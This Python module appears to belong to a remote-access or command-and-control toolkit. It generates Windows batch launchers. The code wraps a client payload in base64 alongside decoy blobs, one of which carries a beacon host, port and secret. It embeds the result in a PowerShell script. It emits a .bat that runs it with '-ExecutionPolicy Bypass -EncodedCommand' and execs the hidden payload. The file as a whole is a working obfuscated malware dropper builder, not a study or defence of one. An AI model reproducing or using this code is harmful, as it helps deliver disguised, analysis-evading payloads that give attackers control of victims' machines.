"""Windows batch launcher exporter.

Strategy: generate a small PowerShell script that pipes a Python program
(containing the 3-blob + UUID structure) into python via stdin, then embed
*that* script in the .bat via `powershell -EncodedCommand` (UTF-16LE Base64).
"""

import base64

from core.config import Config
from exporter.base_exporter import BaseExporter
from exporter.payload_prep import (
    build_decoy1,
    build_decoy2,
    prepare_payload,
)


class BatExporter(BaseExporter):
    format_name = "bat"
    extension = ".bat"

    def __init__(self, chunk_size=None, beacon_host=None, beacon_port=None):
        kwargs = {}
        if chunk_size is not None:
            kwargs["chunk_size"] = chunk_size
        super().__init__(**kwargs)

        cfg = Config()
        self.beacon_host = beacon_host if beacon_host is not None else cfg.host
        self.beacon_port = beacon_port if beacon_port is not None else cfg.port
        self._master_secret = cfg.auth_secret

    def export(self, client_source: str) -> str:
        uuid, prepared = prepare_payload(client_source)
        actual_b64 = self.payload_encoded(prepared)  # single-line b64
        decoy1_b64 = self.payload_encoded(build_decoy1())
        decoy2_b64 = self.payload_encoded(
            build_decoy2(self.beacon_host, self.beacon_port, self._master_secret),
        )

        # Python program (runs via `python -c "..."` on stdin, reads its
        # own source from a PS here-string). Kept to ONE line inside the
        # PS here-string — _b64 can't contain newlines or quotes, so
        # wrapping it in a PS @'...'@ is safe.
        py_one_liner = (
            "import base64 as _b64, sys as _rsc_sys\n"
            f"_RSC_UUID = {uuid!r}\n"
            "_RSC_LAUNCHED = True\n"
            f"_ACTUAL_B64 = {actual_b64!r}\n"
            f"_DECOY1_B64 = {decoy1_b64!r}\n"
            f"_DECOY2_B64 = {decoy2_b64!r}\n"
            "try:\n"
            "    _RSC_LOADER = _b64.b64decode(_DECOY1_B64)\n"
            "    _RSC_DIAG = _b64.b64decode(_DECOY2_B64)\n"
            "except Exception:\n"
            "    pass\n"
            "exec(compile(_b64.b64decode(_ACTUAL_B64), '<payload>', 'exec'))\n"
        )

        # PS script: read here-string, strip whitespace, feed to python -c.
        # `python -c` receives the *program* on stdin (single source of truth).
        ps_script = (
            "$prog = @'\n"
            f"{py_one_liner}"
            "'@\n"
            "$prog | python -c \"import sys;exec(compile(sys.stdin.read(),'<payload>','exec'))\"\n"
        )

        encoded_cmd = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
        return (
            "@echo off\r\n"
            "REM Auto-generated payload launcher.\r\n"
            "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
            f"{encoded_cmd}\r\n"
        )
